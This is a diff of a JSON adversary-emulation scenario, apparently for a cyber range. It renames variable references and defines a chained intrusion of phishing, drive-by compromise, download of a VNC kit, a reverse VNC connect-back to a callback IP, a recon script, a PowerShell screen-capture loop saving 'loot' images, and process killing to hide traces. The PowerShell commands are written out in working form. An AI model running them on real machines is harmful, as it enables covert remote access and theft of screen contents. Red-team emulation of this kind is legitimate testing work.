@@ -13,7 +13,10 @@
             "technique": "Actuator",
             "label": "actuator",
             "preconditions": {
-                "tool": "self.tool_name"
+                "tool": "state.tool_name"
+            },
+            "set_state": {
+                "actuator": "postconditions.actuator.ret.registered_id"
             }
         },
         {
@@ -21,9 +24,9 @@
             "technique": "Interfaces",
             "label": "Interfaces",
             "preconditions": {
-                "tool": "self.tool",
-                "exfil": "self.exfil",
-                "driveby": "self.driveby"
+                "tool": "state.tool",
+                "exfil": "state.exfil",
+                "driveby": "state.driveby"
             }
         },
         {
@@ -31,9 +34,9 @@
             "technique": "DNS",
             "label": "DNS",
             "preconditions": {
-                "tool": "self.tool",
-                "exfil": "self.exfil",
-                "driveby": "self.driveby"
+                "tool": "state.tool",
+                "exfil": "state.exfil",
+                "driveby": "state.driveby"
             }
         },
         {
@@ -41,11 +44,11 @@
             "technique": "NGINX",
             "label": "NGINX",
             "preconditions": {
-                "self.tool_name": "self.tool",
-                "payload": "self.payload_name",
-                "exfiltration": "self.exfil",
-                "driveby": "self.driveby",
-                "driveby_ctl": "self.chimera"
+                "state.tool_name": "state.tool",
+                "payload": "state.payload_name",
+                "exfiltration": "state.exfil",
+                "driveby": "state.driveby",
+                "driveby_ctl": "state.chimera"
             }
         },
         {
@@ -53,7 +56,7 @@
             "technique": "Interfaces",
             "label": "Interfaces2",
             "preconditions": {
-                "driveby": "self.driveby2"
+                "driveby": "state.driveby2"
             }
         },
         {
@@ -61,7 +64,7 @@
             "technique": "DNS",
             "label": "DNS2",
             "preconditions": {
-                "driveby": "self.driveby2"
+                "driveby": "state.driveby2"
             }
         },
         {
@@ -70,8 +73,8 @@
             "label": "NGINX2",
             "preconditions": {
                 "payload": "vnc_recon_v1-kit.zip",
-                "driveby": "self.driveby2",
-                "driveby_ctl": "self.chimera"
+                "driveby": "state.driveby2",
+                "driveby_ctl": "state.chimera"
             }
         },
         {
@@ -79,7 +82,7 @@
             "technique": "PayloadCheapride",
             "label": "Payload",
             "preconditions": {
-                "tool": "self.tool"
+                "tool": "state.tool"
             }
         },
         {
@@ -87,11 +90,11 @@
             "technique": "DriveByCompromise",
             "label": "driveByCompromise",
             "preconditions": {
-                "actuator": "self.actuator",
-                "phishing": "self.phish_1",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_1"
+                "actuator": "state.actuator",
+                "phishing": "state.phish_1",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_1"
             }
         },
         {
@@ -99,11 +102,11 @@
             "technique": "UserExecution",
             "label": "userExecution",
             "preconditions": {
-                "actuator_id": "self.actuator",
-                "phishing": "self.phish_1",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_1"
+                "actuator_id": "state.actuator",
+                "phishing": "state.phish_1",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_1"
             }
         },
         {
@@ -111,11 +114,14 @@
             "technique": "WebProtocols",
             "label": "webProtocols_1",
             "preconditions": {
-                "actuator_id": "self.actuator",
-                "phishing": "self.phish_1",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_1"
+                "actuator_id": "state.actuator",
+                "phishing": "state.phish_1",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_1"
+            },
+            "set_state": {
+                "agent_tgt1": "postconditions.agent.ret.agent_id"
             }
         },
         {
@@ -123,13 +129,13 @@
             "technique": "IngressToolTransfer",
             "label": "Get-vnc-kit_t1_1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "file_store_server": "self.driveby_domain2",
-                "file_name": "self.tool_name2",
+                "file_store_server": "state.driveby_domain2",
+                "file_name": "state.tool_name2",
                 "output_directory": "C:\\Users\\Public",
                 "output_file_name": "vnc-kit.zip"
             }
@@ -139,9 +145,9 @@
             "technique": "DeobfuscateDecodeFilesOrInformation",
             "label": "Uncompress-kit_t1_2",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "powershell &{Expand-Archive C:\\Users\\Public\\vnc-kit.zip -DestinationPath C:\\Users\\Public\\vnc-kit; echo 'Unzip Complete'}"
@@ -152,9 +158,9 @@
             "technique": "FileDeletionPowershell",
             "label": "FileDeletion_t1_3",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "powershell &{Remove-Item C:\\Users\\Public\\vnc-kit.zip; echo 'Removed ZIP Tools'}"
@@ -165,12 +171,12 @@
             "technique": "RemoteAccessSoftware",
             "label": "Start-VNC_t1_4",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{Start-Process C:\\Users\\Public\\vnc-kit\\winvnc.exe; Start-sleep 5; C:\\Users\\Public\\vnc-kit\\winvnc.exe -connect${{'kind': 'slice', 'slice': 0, 'value': {'kind': 'call', 'func': {'kind': 'attribute', 'attr': 'split', 'value': 'self.tool_call_back_ip'}, 'args': ['/', 1]}}}; echo 'Executed VNC Connect Back'; }"
+                "command": "powershell &{Start-Process C:\\Users\\Public\\vnc-kit\\winvnc.exe; Start-sleep 5; C:\\Users\\Public\\vnc-kit\\winvnc.exe -connect${{'kind': 'slice', 'slice': 0, 'value': {'kind': 'call', 'func': {'kind': 'attribute', 'attr': 'split', 'value': 'state.tool_call_back_ip'}, 'args': ['/', 1]}}}; echo 'Executed VNC Connect Back'; }"
             }
         },
         {
@@ -178,9 +184,9 @@
             "technique": "RemoteAccessSoftware",
             "label": "Recon-Box_t1_5",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "powershell &{Start-Process C:\\Users\\Public\\vnc-kit\\vnc_recon.bat; echo 'Started BAT script'}"
@@ -191,9 +197,9 @@
             "technique": "ScreenCapture",
             "label": "ScreenCapture_t1_6",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "powershell &{[Reflection.Assembly]::LoadWithPartialName('System.Drawing');[void] [System.Reflection.Assembly]::LoadWithPartialName('System.Drawing');[void] [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');function screenshot($path){$width = 0;$height = 0;$workingAreaX = 0;$workingAreaY = 0;$screen = [System.Windows.Forms.Screen]::AllScreens;foreach ($item in $screen){if($workingAreaX -gt $item.WorkingArea.X){$workingAreaX = $item.WorkingArea.X;}if($workingAreaY -gt $item.WorkingArea.Y){$workingAreaY = $item.WorkingArea.Y;}$width = $width + $item.Bounds.Width;if($item.Bounds.Height -gt $height){$height = $item.Bounds.Height;}}$bounds = [Drawing.Rectangle]::FromLTRB($workingAreaX, $workingAreaY, $width, $height);$bmp = New-Object Drawing.Bitmap $width, $height;$graphics = [Drawing.Graphics]::FromImage($bmp);$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);$bmp.Save($path);$graphics.Dispose();$bmp.Dispose();}; $cnt=0; while($cnt -lt 6){screenshot \"c:\\Users\\Public\\vnc-kit\\vnc_loot_$(get-random).png\"; $cnt = $cnt+1; Start-Sleep 15;};echo 'Completed Multiple Screenshots'}"
@@ -204,9 +210,9 @@
             "technique": "HideArtifacts",
             "label": "Stop-VNC_t1_7",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "powershell &{Stop-Process -name winvnc; echo 'Kill VNC process'}"
@@ -217,9 +223,9 @@
             "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             }
         }
     ],
@@ -325,127 +331,21 @@
             }
         }
     },
-    "preconditions": {
-        "state": {},
-        "initial": {
-            "tool_name": {
-                "path": [
-                    "tool",
-                    "1",
-                    "name"
-                ]
-            },
-            "payload_name": {
-                "path": [
-                    "tool",
-                    "1",
-                    "ioc-binary_payload_name"
-                ]
-            },
-            "tool": {
-                "path": [
-                    "tool",
-                    "1"
-                ]
-            },
-            "tool_call_back_ip": {
-                "path": [
-                    "tool",
-                    "1",
-                    "ioc-ip_callback"
-                ]
-            },
-            "tool_name2": {
-                "path": [
-                    "tool",
-                    "2",
-                    "name"
-                ]
-            },
-            "range": {
-                "path": [
-                    "range"
-                ]
-            },
-            "exfil": {
-                "path": [
-                    "exfil",
-                    "1"
-                ]
-            },
-            "driveby": {
-                "path": [
-                    "driveby",
-                    "1"
-                ]
-            },
-            "driveby_domain": {
-                "path": [
-                    "driveby",
-                    "1",
-                    "ioc-domain_driveby"
-                ]
-            },
-            "driveby2": {
-                "path": [
-                    "driveby",
-                    "2"
-                ]
-            },
-            "driveby_domain2": {
-                "path": [
-                    "driveby",
-                    "2",
-                    "ioc-domain_driveby"
-                ]
-            },
-            "chimera": {
-                "path": [
-                    "chimera"
-                ]
-            },
-            "phish_1": {
-                "path": [
-                    "phishing",
-                    "1"
-                ]
-            },
-            "target_1": {
-                "path": [
-                    "targets",
-                    "1"
-                ]
-            },
-            "domain": {
-                "path": [
-                    "range",
-                    "query-ad_domain"
-                ]
-            }
-        },
-        "effects": {
-            "actuator": {
-                "path": [
-                    "actuator",
-                    "actuator",
-                    "ret",
-                    "registered_id"
-                ],
-                "default": 0
-            },
-            "scenario_infrastructure": {
-                "path": [
-                    "infrastructure"
-                ]
-            },
-            "agent_tgt1": {
-                "path": [
-                    "webProtocols_1",
-                    "agent",
-                    "ret",
-                    "agent_id"
-                ]
-            }
-        }
+    "state": {
+        "tool_name": "spec.tool.1.name",
+        "payload_name": "spec.tool.1.ioc-binary_payload_name",
+        "tool": "spec.tool.1",
+        "tool_call_back_ip": "spec.tool.1.ioc-ip_callback",
+        "tool_name2": "spec.tool.2.name",
+        "range": "spec.range",
+        "exfil": "spec.exfil.1",
+        "driveby": "spec.driveby.1",
+        "driveby_domain": "spec.driveby.1.ioc-domain_driveby",
+        "driveby2": "spec.driveby.2",
+        "driveby_domain2": "spec.driveby.2.ioc-domain_driveby",
+        "chimera": "spec.chimera",
+        "phish_1": "spec.phishing.1",
+        "target_1": "spec.targets.1",
+        "domain": "spec.range.query-ad_domain"
     }
 }
